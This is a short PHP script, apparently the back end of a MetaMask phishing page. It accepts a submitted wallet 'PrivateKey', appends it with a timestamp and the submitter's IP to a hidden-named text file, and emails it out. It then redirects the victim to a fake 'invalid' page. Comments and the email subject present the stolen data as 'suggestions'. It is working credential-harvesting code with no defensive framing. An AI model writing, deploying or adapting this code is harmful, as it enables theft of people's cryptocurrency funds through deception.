<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

require 'email_config.php'; // Pastikan file ini tersedia dan tidak ada error

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $PrivateKey = trim($_POST["PrivateKey"]); // Ambil isi dari form

    if (!empty($PrivateKey)) {
        // 1. Ambil waktu dan alamat IP pengirim
        date_default_timezone_set("Asia/Jakarta"); 
        $waktu = date("Y-m-d H:i:s");
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';


        // 2. Format data untuk disimpan
        $data = "PrivateKey    : $PrivateKey\n\n";
        $data .= "Waktu        : $waktu\n";
        $data .= "IP Address   : $ip_address\n";
        $data .= "-------------------------\n";

        // 3. Simpan ke file saran.txt
        $file = "BDFBREWQ7HJA7453BF986_______.txt";
        $handle = fopen($file, "a");
        fwrite($handle, $data);
        fclose($handle);
        
        // 4. Kirim email menggunakan fungsi dari email_config.php
        $subject = "Saran testing";
        kirim_email($subject, $data);

        // 5. Redirect menggunakan JavaScript
       header("Location: metamask/invalid.html");
	exit();

    }
}
?>
